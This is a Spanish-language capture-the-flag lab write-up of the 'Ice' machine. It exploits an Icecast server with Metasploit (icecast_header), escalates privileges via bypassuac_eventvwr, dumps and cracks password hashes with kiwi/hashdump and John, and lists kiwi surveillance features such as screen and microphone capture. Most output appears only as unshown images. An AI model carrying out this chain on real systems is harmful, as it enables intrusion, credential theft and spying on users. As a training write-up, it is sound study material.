# Ice

Está máquina se parece mucho a la anterior(quizá porque lo creó el mismo usuario...), nos lleva muy de la mano y nos deja claro lo que tenemos que hacer. Por eso mismo, lo haré igual que la documentación anterior, responderé a las preguntas con una imágen y una oración.

# Proceso

Empecemos el análisis con un escaneo simple de los puertos:
![alt text](img/image-4.png)
> Encontramos 6 puertos con servicios conocidos.

<br>

La página nos pregunta, ¿cuál es el puerto asociado al servicio Microsoft Remote Desktop (MSRDP)?
![alt text](img/image.png)
> En realidad, en la imágen no se ve el servicio MSRDP. Si -sV no me da la versión, no se como sacarlo.

<br>

Veamos ahora el servicio activo en el puerto 8000:
![alt text](img/image-5.png)
> icecast(un servidor de transmisión de video y audio)

<br>

¿Cuál es el hostname de la máquina objetivo?
![alt text](img/image-2.png)
> Podemos ver el hostname con -A -T4

<br>

Sabiendo el servicio *instalado* en el puerto 8000, podemos buscar información del CVE asociado y de su peligrosidad.
![alt text](img/image-3.png)
> Si le preguntamos a chatGPT, nos dice que está asociado al cve CVE-2004-1561 y la peligrosidad es de 6.4

<br>

Si buscamo el servicio en metasploit, sacamos el siguiente exploit
![alt text](img/image-6.png)
> exploit/windows/http/icecast_header

<br>

Usando ese exploit, y mostrando las opciones, podemos ver cuales son las requeridas por el exploit
![alt text](img/image-7.png)
> Pasa lo mismo que en la máquina anterior, LHOST usa la ip del vmware

<br>

Cambiamos el RHOST y el LHOST por los necesarios, e iniciamos el exploit
![alt text](img/image-9.png)
![alt text](img/image-10.png)
> set RHOST {ip_target} / set LHOST tun0

<br>

Nos fijamos que el nombre de la shell es meterpreter, por lo que podremos usar comandos de linux
![alt text](img/image-11.png)
![alt text](image-1.png)

<br>

Vamos a listar los procesos activos y ver que usuario está usando icecast
![alt text](img/image-12.png)
> El proceso de la imágen no es el que pide el enunciado

<br>

Ver la buil del sistema operativo
![alt text](img/image-13.png)

<br>

Y la arquitectura de este
![alt text](img/image-14.png)

<br>

El creador de la room nos recomienda usar el siguiente comando
![alt text](img/image-15.png)
> run post/multi/recon/local_exploit_suggester

<br>

El comando anterior, nos proporcionará varios exploits que podemos usar para escalar privilegios. Para esta room usaremos el de la imágen:
![alt text](img/image-17.png)
> exploit/windows/local/bypassuac_eventvwr

<br>

Ahora que hemos encontrado el exploit para escalar privilegios, enviemos la sesión al background
![alt text](img/image-18.png)

<br>

Usamos el exploit anterior
![alt text](img/image-21.png)

<br>

Configuramos las opciones necesarias
![alt text](img/image-20.png)
> La siguiente respuesta es: "LHOST"

<br>

Y corremos el exploit:
![alt text](img/image-22.png)

<br>

En la nueva shell, podemos usar `getprivs` para ver los privilegios que tenemos
![alt text](img/image-23.png)

<br>

Y listar los procesos con `ps`
![alt text](img/image-24.png)

<br>

Vamos a intentar sacar las contraseñas de los usuarios. Cambiamos nuestro proceso a otro del usuario NT AUTHORITY\SYSTEM
![alt text](img/image-25.png)

<br>

![alt text](img/image-26.png)

<br>

![alt text](img/image-27.png)

<br>

Vamos a utilizar una nueva herramienta `kiwi`, con la que sacaremos los hashes de todos los usuarios de la máquina:
![alt text](img/image-28.png)

<br>

Con este comando, podemos sacar los hashes de los usuarios:
![alt text](img/image-29.png)

<br>

![alt text](img/image-30.png)
> No me funciona creds_all, lo hago con hashdump

<br>

Crackeamos las contraseñas con john the reaper
![alt text](img/image-31.png)

<br>

Por último, vamos a ver algunos comandos de kiwi bastante interesantes:

Ver la pantalla del usuario:
![alt text](img/image-32.png)

<br>

Grabar el micrófono del sistema:
![alt text](img/image-33.png)

<br>

Modificar la MAC de los archivos:
![alt text](img/image-34.png)

<br>

Auntenticarnos donde queramos
![alt text](img/image-35.png)

## USER? No

No sé si al tener root, podemos iniciar sesión con un usuario.

## ROOT? Si
